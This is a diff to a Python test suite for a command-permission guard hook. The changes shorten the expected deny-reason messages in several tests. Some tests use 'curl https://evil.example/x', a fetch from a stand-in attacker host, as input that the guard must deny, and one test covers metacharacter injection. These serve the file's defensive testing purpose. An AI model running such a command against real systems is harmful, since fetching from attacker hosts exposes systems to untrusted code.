@@ -353,7 +353,7 @@ def test_quoted_metacharacter_injection_still_denies(monkeypatch):
     assert result is not None
     assert result["hookSpecificOutput"]["permissionDecision"] == "deny"
     assert (
-        "first command token is not coordinator-doc-new"
+        "not coordinator-doc-new"
         in result["hookSpecificOutput"]["permissionDecisionReason"]
     )
 
@@ -1439,7 +1439,7 @@ def test_python3_script_path_deny_reason_names_both_tokens(monkeypatch):
     assert "myscript.py" in reason
     # The old wording asserted the script path WAS argv[0] -- must not
     # survive for a command where the two tokens genuinely differ.
-    assert "first command token is not coordinator-doc-new (got: myscript.py)" not in reason
+    assert "not coordinator-doc-new (got: myscript.py)" not in reason
 
 
 def test_python3_quoted_script_path_with_spaces_deny_reason_names_both_tokens(monkeypatch):
@@ -1472,7 +1472,7 @@ def test_curl_deny_reason_unchanged_when_tokens_coincide(monkeypatch):
     # "invoked via" clause.
     result = _deny("curl https://evil.example/x", monkeypatch)
     reason = result["hookSpecificOutput"]["permissionDecisionReason"]
-    assert "first command token is not coordinator-doc-new (got: curl)" in reason
+    assert "not coordinator-doc-new (got: curl)" in reason
     assert "invoked via" not in reason
 
 
@@ -1676,7 +1676,7 @@ def test_out_of_scope_command_keeps_generic_message_and_dont_retry_advice():
     reason = guard._deny_reason(
         "coordinator:executor",
         "curl https://evil.example/x",
-        "first command token is not coordinator-doc-new (got: curl)",
+        "not coordinator-doc-new (got: curl)",
         suppress_retry_advice=False,
     )
     assert "report the blocker to the dispatching EM rather than retrying it." in reason
